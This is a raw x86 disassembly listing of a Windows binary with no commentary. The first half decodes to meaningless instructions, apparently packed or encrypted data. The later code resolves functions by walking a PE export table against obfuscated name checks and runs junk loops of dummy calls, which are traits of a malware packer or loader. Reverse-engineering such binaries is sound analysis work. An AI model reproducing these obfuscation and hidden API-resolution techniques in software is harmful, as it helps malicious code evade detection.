  40fecb:	test   eax,0x6c250cfe
  40fed0:	arpl   WORD PTR [ebp+0x280310d],bp
  40fed6:	shl    DWORD PTR [edi+0x412376bd],0xa0
  40fedd:	in     eax,dx
  40fede:	or     al,0xa2
  40fee0:	push   0xd490a714
  40fee5:	pop    esp
  40fee6:	push   edi
  40fee7:	lods   eax,DWORD PTR ds:[esi]
  40fee8:	mov    ebp,0x2a253f0b
  40feed:	xor    al,0x23
  40feef:	outs   dx,BYTE PTR ds:[esi]
  40fef0:	cwde   
  40fef1:	adc    bh,BYTE PTR [edx+eax*1-0x1f]
  40fef5:	xchg   ebp,eax
  40fef6:	shl    DWORD PTR [eax-0x48],0xe6
  40fefa:	mov    bl,0xad
  40fefc:	jo     0x40fefe
  40fefe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feff:	rcl    bl,cl
  40ff01:	add    DWORD PTR [esi-0x55cc309f],eax
  40ff07:	inc    ecx
  40ff08:	cmp    DWORD PTR [edi-0x30],ebp
  40ff0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff0c:	mov    ds:0x31cf176a,eax
  40ff11:	jmp    0xaab8783f
  40ff16:	shl    ebx,0x70
  40ff19:	mov    ecx,0x21a65ca4
  40ff1e:	jne    0x40ff41
  40ff20:	retf   0x985a
  40ff23:	outs   dx,DWORD PTR ds:[esi]
  40ff24:	jns    0x40ffa4
  40ff26:	lea    esp,[ebp+0x38f040ab]
  40ff2c:	stc    
  40ff2d:	int    0x7b
  40ff2f:	fst    QWORD PTR [edi]
  40ff31:	xchg   ecx,eax
  40ff32:	or     ebx,ebp
  40ff34:	xor    BYTE PTR ds:0x5c82b826,cl
  40ff3a:	in     al,dx
  40ff3b:	xor    bh,BYTE PTR ds:0xbe3500a6
  40ff41:	pusha  
  40ff42:	push   ebx
  40ff43:	or     eax,0x858388f5
  40ff48:	jne    0x40ff24
  40ff4a:	sub    ebp,DWORD PTR [ecx]
  40ff4c:	aad    0x5b
  40ff4e:	aaa    
  40ff4f:	jge    0x40ff99
  40ff51:	dec    edx
  40ff52:	rcl    ch,0x39
  40ff55:	imul   ecx,DWORD PTR [ecx+ebp*4-0x49fa9011],0xad2e207e
  40ff60:	pop    ebx
  40ff61:	dec    ebp
  40ff62:	mov    esp,0x81c1dc64
  40ff67:	pusha  
  40ff68:	mov    ebx,0x58731ef1
  40ff6e:	stos   BYTE PTR es:[di],al
  40ff70:	mov    ds:0x217bd111,eax
  40ff75:	jbe    0x40fef8
  40ff77:	rcr    BYTE PTR [ecx],1
  40ff79:	adc    edi,DWORD PTR [eax]
  40ff7b:	adc    BYTE PTR ds:0xae531773,ah
  40ff81:	jmp    DWORD PTR [ebp-0x20]
  40ff84:	and    eax,0x3c402a5b
  40ff89:	inc    esi
  40ff8a:	mov    BYTE PTR [esi+0x3819c2b0],al
  40ff90:	inc    edx
  40ff91:	mov    bh,0x4a
  40ff93:	outs   dx,DWORD PTR ds:[esi]
  40ff94:	in     al,0xd7
  40ff96:	daa    
  40ff97:	sbb    eax,0x2ebfada6
  40ff9c:	rcl    bl,1
  40ff9e:	out    dx,eax
  40ff9f:	das    
  40ffa0:	out    dx,eax
  40ffa1:	bound  eax,QWORD PTR [edi+0x1763fd07]
  40ffa7:	jb     0x40ff98
  40ffa9:	mov    WORD PTR [ebx],cs
  40ffab:	(bad)  
  40ffac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffad:	in     al,dx
  40ffae:	jo     0x40ff33
  40ffb0:	pop    edx
  40ffb1:	jne    0x40ffbe
  40ffb3:	call   0x7dfd:0x75fb3f19
  40ffba:	add    bl,al
  40ffbc:	add    DWORD PTR [edx+0x7d],edx
  40ffbf:	data16 jle 0x40ff4e
  40ffc2:	add    al,0x19
  40ffc4:	ins    BYTE PTR es:[edi],dx
  40ffc5:	imul   ecx,ebx,0x687be36a
  40ffcb:	jmp    0xb9eb0b79
  40ffd0:	into   
  40ffd1:	and    bl,ah
  40ffd3:	or     DWORD PTR [ecx+0x6f],ecx
  40ffd6:	jnp    0x40ff5e
  40ffd8:	test   al,0xb6
  40ffda:	mov    ah,bh
  40ffdc:	sbb    dh,BYTE PTR [edi]
  40ffde:	mov    ds:0x89eeabce,al
  40ffe3:	mov    eax,ds:0x4227c4a5
  40ffe8:	jmp    0x2b6c:0x1af7e752
  40ffef:	sub    DWORD PTR [edi+ebp*8-0x49d4c0b8],edi
  40fff6:	fld    DWORD PTR [esi-0x2c]
  40fff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fffa:	xor    eax,0x72b40b9e
  40ffff:	fdivr  QWORD PTR ds:0x25724df0
  410005:	scas   eax,DWORD PTR es:[edi]
  410006:	out    dx,al
  410007:	xchg   edi,eax
  410008:	out    dx,eax
  410009:	out    0xa4,eax
  41000b:	lahf   
  41000c:	out    0x9,eax
  41000e:	(bad)  
  410010:	push   ebp
  410011:	ret    0x7487
  410014:	adc    eax,0xe8a02418
  410019:	je     0x41008f
  41001b:	ins    BYTE PTR es:[edi],dx
  41001c:	mov    WORD PTR [ecx-0x2],gs
  41001f:	nop
  410020:	and    eax,0x3742cf51
  410025:	mov    fs,WORD PTR [edx+ecx*1-0x3a]
  410029:	inc    edx
  41002a:	jle    0x40ffac
  41002c:	add    eax,0x4cfc9baa
  410031:	sub    DWORD PTR [edi+0x53],eax
  410034:	mov    al,ds:0x7158e51c
  410039:	les    esi,FWORD PTR [esi-0x2320a261]
  41003f:	or     al,0x2d
  410041:	gs es gs jb 0x40ffd2
  410046:	popf   
  410047:	neg    DWORD PTR [eax-0x45]
  41004a:	dec    ebp
  41004b:	lods   eax,DWORD PTR ds:[esi]
  41004c:	cs inc esp
  41004e:	mov    ebp,DWORD PTR [ebp-0x55]
  410051:	jmp    0x7d3f:0x3a76aaaa
  410058:	retf   
  410059:	sbb    bl,BYTE PTR [edi]
  41005b:	xor    al,0xb0
  41005d:	retf   
  41005e:	out    dx,al
  41005f:	sar    BYTE PTR [edi+0x62],1
  410062:	and    ecx,DWORD PTR [esi-0x395faf71]
  410068:	repnz fsubr DWORD PTR [eax]
  41006b:	ss jae 0x4100bf
  41006e:	xchg   edi,eax
  41006f:	sahf   
  410070:	and    DWORD PTR [ecx-0x10],0x7f
  410074:	das    
  410075:	sub    bh,BYTE PTR [ecx]
  410077:	push   0xffffffe5
  410079:	inc    ebx
  41007a:	xlat   BYTE PTR ds:[ebx]
  41007b:	jmp    0xdc9b:0x8d04fc74
  410082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410083:	inc    edx
  410084:	(bad)  
  410085:	ins    DWORD PTR es:[edi],dx
  410086:	and    al,0x12
  410088:	jb     0x410083
  41008a:	lods   eax,DWORD PTR ds:[esi]
  41008b:	test   BYTE PTR [ecx+0x46],bl
  41008e:	not    BYTE PTR [ecx]
  410090:	sub    esp,ecx
  410092:	pop    es
  410093:	mov    cs,WORD PTR [esi+0x7]
  410096:	xor    esp,eax
  410098:	adc    bh,BYTE PTR [ebx+0x28a05499]
  41009e:	stc    
  41009f:	pop    ds
  4100a0:	lods   al,BYTE PTR ds:[esi]
  4100a1:	jae    0x410046
  4100a3:	cmp    edi,DWORD PTR [edx+0xa]
  4100a6:	fldenv [edx]
  4100a8:	ins    DWORD PTR es:[edi],dx
  4100a9:	ds loop 0x4100be
  4100ac:	inc    edi
  4100ad:	push   ds
  4100ae:	lods   eax,DWORD PTR ds:[esi]
  4100af:	dec    ecx
  4100b0:	sbb    edx,DWORD PTR [eax-0x174c090a]
  4100b6:	sub    DWORD PTR [ebx+0x4f892d38],edi
  4100bc:	(bad)  
  4100bd:	das    
  4100be:	daa    
  4100bf:	xchg   DWORD PTR [edx],ecx
  4100c1:	xchg   esp,eax
  4100c2:	ss push cs
  4100c4:	clc    
  4100c5:	cmp    DWORD PTR [ebx-0x38146d78],esp
  4100cb:	into   
  4100cc:	int3   
  4100cd:	adc    BYTE PTR [edi],bh
  4100cf:	outs   dx,BYTE PTR ds:[esi]
  4100d0:	scas   al,BYTE PTR es:[edi]
  4100d1:	and    BYTE PTR ds:0x3e2c9c86,0xa0
  4100d8:	or     bh,BYTE PTR [eax]
  4100da:	out    0x72,al
  4100dc:	not    DWORD PTR [ebp+0x15]
  4100df:	ret    
  4100e0:	rcl    ebp,cl
  4100e2:	and    DWORD PTR [edi],ebp
  4100e4:	mov    DWORD PTR [eax+ebp*2+0x56ad9e20],esi
  4100eb:	xor    DWORD PTR [ebx],esp
  4100ed:	std    
  4100ee:	mov    esp,0x7d75f670
  4100f3:	mov    ah,0x17
  4100f5:	pop    esp
  4100f6:	pop    eax
  4100f7:	pushf  
  4100f8:	add    dl,BYTE PTR [eax+0x55]
  4100fb:	sbb    DWORD PTR ds:0xce16ce94,esi
  410101:	(bad)  
  410102:	cli    
  410103:	add    al,0x48
  410105:	mov    ds:0xa8d97dc,eax
  41010a:	repz aad 0x91
  41010d:	call   0xc8e9:0xf190f1b3
  410114:	stos   DWORD PTR es:[edi],eax
  410115:	or     DWORD PTR [esi],esi
  410117:	xchg   ecx,eax
  410118:	cmp    eax,0x9bbb077
  41011d:	and    bl,BYTE PTR [esi-0x515b723b]
  410123:	or     ah,BYTE PTR [ebp+0x70]
  410126:	int3   
  410127:	iret   
  410128:	mov    cl,0xde
  41012a:	mov    ah,0x53
  41012c:	test   ebx,edi
  41012e:	fs mov cl,0x54
  410131:	test   eax,0x5ebee344
  410136:	sbb    al,0x31
  410138:	mov    WORD PTR [edx],fs
  41013a:	ja     0x41012e
  41013c:	scas   eax,DWORD PTR es:[edi]
  41013d:	loopne 0x41014e
  41013f:	sub    edx,DWORD PTR [ebx]
  410141:	adc    eax,0xe73beb33
  410146:	not    BYTE PTR [esi]
  410148:	in     eax,0x25
  41014a:	xor    DWORD PTR [eax],0x5e
  41014d:	or     BYTE PTR [edi-0x58],ah
  410150:	enter  0xf627,0x8f
  410154:	push   eax
  410155:	(bad)  
  410156:	dec    BYTE PTR [esi-0x7e]
  410159:	fld    st(5)
  41015b:	imul   DWORD PTR [ebp+0x57a78cb8]
  410161:	and    DWORD PTR [eax-0x11],eax
  410164:	sbb    esp,esp
  410166:	cmpxchg ecx,esi
  410169:	lds    edi,FWORD PTR [ebx-0x3197cb12]
  41016f:	lods   eax,DWORD PTR ds:[esi]
  410170:	or     DWORD PTR [ecx+0x7536aa3d],edx
  410176:	push   ecx
  410177:	pop    esp
  410178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410179:	test   bl,dh
  41017b:	imul   eax,DWORD PTR [eax-0x1a],0xcf37eaca
  410182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410183:	jns    0x410173
  410185:	ret    
  410186:	fcmovb st,st(3)
  410188:	inc    esp
  410189:	test   al,0x1d
  41018b:	shl    al,1
  41018d:	scas   al,BYTE PTR es:[edi]
  41018e:	loop   0x410193
  410190:	out    dx,al
  410191:	pusha  
  410192:	cmp    ecx,DWORD PTR [ecx+edx*2+0x4b447f3d]
  410199:	hlt    
  41019a:	sub    eax,0x4bc80988
  41019f:	pop    esp
  4101a0:	sbb    eax,0xc0c6fb43
  4101a5:	adc    al,0xb4
  4101a7:	call   0x3096:0x641e853a
  4101ae:	and    edi,DWORD PTR [eax]
  4101b0:	ficom  DWORD PTR [ecx+0x847fab9]
  4101b6:	cmp    ah,BYTE PTR [edi+0x78d0d6ed]
  4101bc:	mov    edx,0x34dc59d0
  4101c1:	cmp    al,0x4e
  4101c3:	data16 (bad) 
  4101c5:	and    al,0xb5
  4101c7:	aaa    
  4101c8:	stos   DWORD PTR es:[edi],eax
  4101c9:	scas   al,BYTE PTR es:[edi]
  4101ca:	imul   eax,DWORD PTR [ebx-0x1d95c733],0x39
  4101d1:	add    al,0x3e
  4101d3:	add    al,0xd2
  4101d5:	cmp    edi,DWORD PTR [ecx]
  4101d7:	inc    eax
  4101d8:	xchg   BYTE PTR [ecx+0x1],bl
  4101db:	and    eax,0xfcfa5b75
  4101e0:	jge    0x41017c
  4101e2:	cli    
  4101e3:	test   eax,0x2d53e795
  4101e8:	sbb    bh,bl
  4101ea:	stos   BYTE PTR es:[edi],al
  4101eb:	retf   0xd1f6
  4101ee:	cmp    eax,0xaf92c386
  4101f3:	mov    dl,0x67
  4101f5:	inc    ebx
  4101f6:	lock stos BYTE PTR es:[edi],al
  4101f8:	std    
  4101f9:	xchg   ebx,eax
  4101fa:	jb     0x41024d
  4101fc:	in     al,0x19
  4101fe:	sbb    dl,BYTE PTR [esi-0x3f]
  410201:	pop    ecx
  410202:	mov    ds:0x846c31eb,eax
  410207:	adc    ebx,DWORD PTR [edi]
  410209:	out    dx,eax
  41020a:	aam    0x49
  41020c:	in     al,0x1d
  41020e:	jne    0x41019e
  410210:	(bad)  
  410211:	rol    ch,0x3b
  410214:	test   DWORD PTR [esi-0x69],eax
  410217:	in     eax,0x81
  410219:	das    
  41021a:	fstp   DWORD PTR [ecx]
  41021c:	sub    BYTE PTR [ecx],bh
  41021e:	mov    ds:0x70504af,al
  410223:	xchg   BYTE PTR [ebp-0x45],cl
  410226:	inc    ebx
  410227:	retf   
  410228:	push   ebp
  410229:	lea    eax,[esi]
  41022b:	lods   al,BYTE PTR ds:[esi]
  41022c:	push   ebx
  41022d:	mov    bl,0xd5
  41022f:	adc    al,0x24
  410231:	sub    eax,0xc3733d4b
  410236:	dec    eax
  410237:	test   al,0xb6
  410239:	fcomip st,st(4)
  41023b:	mov    esp,0xcf8833a
  410240:	add    al,0x7
  410242:	mov    bh,0xa8
  410244:	fsubr  st,st(4)
  410246:	cs (bad) 
  410249:	add    DWORD PTR [edi],edx
  41024b:	mov    ds:0x8cfe734e,al
  410250:	stc    
  410251:	xlat   BYTE PTR ds:[ebx]
  410252:	stos   DWORD PTR es:[edi],eax
  410253:	hlt    
  410254:	add    BYTE PTR [ebx+0x6e51460f],dl
  41025a:	aam    0xa
  41025c:	ror    DWORD PTR cs:[ebx-0x3c28e149],0x62
  410264:	sbb    ch,BYTE PTR [edx+0x68]
  410267:	(bad)  
  410268:	pop    ecx
  410269:	(bad)  
  41026a:	or     dl,ah
  41026c:	sbb    esi,0xfcdc2e6c
  410272:	in     al,dx
  410273:	mov    ebx,0x7c0b7532
  410279:	test   eax,0x7b649e09
  41027e:	loope  0x41023f
  410280:	or     dl,BYTE PTR [ebx-0x66]
  410283:	push   0xffffff81
  410285:	and    BYTE PTR [ecx],0xbb
  410288:	pop    ds
  410289:	test   BYTE PTR [ecx],ch
  41028b:	push   ss
  41028c:	or     ch,BYTE PTR [ebx+0x30]
  41028f:	in     al,0x5e
  410291:	add    cl,BYTE PTR [ebx]
  410293:	cmc    
  410294:	xchg   ebp,eax
  410295:	pop    ds
  410296:	add    al,0xd3
  410298:	mov    ecx,eax
  41029a:	pop    ecx
  41029b:	adc    DWORD PTR [ebp+0xc],edi
  41029e:	test   al,0x26
  4102a0:	das    
  4102a1:	push   esi
  4102a2:	fidivr WORD PTR [ebp+0x76]
  4102a5:	sub    DWORD PTR [edx+ebx*1+0x4],esp
  4102a9:	xor    BYTE PTR [esi+0x13a624a0],0xcc
  4102b0:	or     al,BYTE PTR [eax+0x61]
  4102b3:	leave  
  4102b4:	mov    ds:0xe7a6604e,eax
  4102b9:	std    
  4102ba:	test   DWORD PTR [esi+eax*4],eax
  4102bd:	xlat   BYTE PTR ds:[ebx]
  4102be:	push   es
  4102bf:	ja     0x4102d7
  4102c1:	lahf   
  4102c2:	inc    esi
  4102c3:	inc    edi
  4102c4:	and    BYTE PTR [edx-0x45],0xa1
  4102c8:	mov    dh,0x7e
  4102ca:	mov    al,0x1d
  4102cc:	mov    DWORD PTR ds:0xd27d250d,eax
  4102d2:	je     0x410270
  4102d4:	pop    esp
  4102d5:	mov    esp,0x59c8713a
  4102da:	jecxz  0x4102ef
  4102dc:	mov    ebx,0xf4950656
  4102e1:	mov    ebp,0xe869bb31
  4102e6:	stc    
  4102e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102e8:	call   0x9f92:0xa0d4a13f
  4102ef:	dec    eax
  4102f0:	in     al,dx
  4102f1:	mov    ch,0x1d
  4102f3:	cmp    al,BYTE PTR [ecx-0x6338ab7f]
  4102f9:	cdq    
  4102fa:	jl     0x4102bf
  4102fc:	aaa    
  4102fd:	xchg   ebp,eax
  4102fe:	jmp    0x410329
  410300:	xor    bl,dl
  410302:	rcr    DWORD PTR [edi],1
  410304:	mov    ch,0xea
  410306:	xchg   esi,eax
  410307:	mov    WORD PTR [esi+0x37],gs
  41030a:	lods   eax,DWORD PTR ds:[esi]
  41030b:	adc    al,0xfd
  41030d:	mov    eax,ds:0xb81f8610
  410312:	hlt    
  410313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410314:	(bad)  
  410315:	stos   BYTE PTR es:[edi],al
  410316:	lahf   
  410317:	(bad)  [ecx-0x1e]
  41031a:	add    BYTE PTR [eax],bh
  41031c:	mov    edi,0x8e024590
  410321:	push   cs
  410322:	test   eax,0xf3ebeab2
  410327:	stos   DWORD PTR es:[edi],eax
  410328:	shr    DWORD PTR [ebx-0x4045beb0],cl
  41032e:	sub    eax,0xdad85627
  410333:	xchg   esi,eax
  410334:	nop
  410335:	iret   
  410336:	or     al,0xc2
  410338:	xchg   edi,eax
  410339:	jmp    0x4800:0x13deacd5
  410340:	ss pop eax
  410342:	lods   al,BYTE PTR ds:[esi]
  410343:	retf   
  410344:	rol    BYTE PTR [ecx+0x71],1
  410347:	mov    al,0xf5
  410349:	push   cs
  41034a:	lods   eax,DWORD PTR ds:[esi]
  41034b:	cmp    cl,BYTE PTR [esi]
  41034d:	ror    BYTE PTR [edx-0x3710c657],cl
  410353:	jb     0x4102d6
  410355:	fistp  QWORD PTR ss:0x64112b92
  41035c:	or     eax,0x8785319f
  410361:	ror    DWORD PTR [ecx],cl
  410363:	xor    BYTE PTR [ebp-0x5b426491],bl
  410369:	xchg   dl,dh
  41036b:	xchg   DWORD PTR [eax-0x45],ebp
  41036e:	dec    ebx
  41036f:	cmp    eax,DWORD PTR [eax]
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
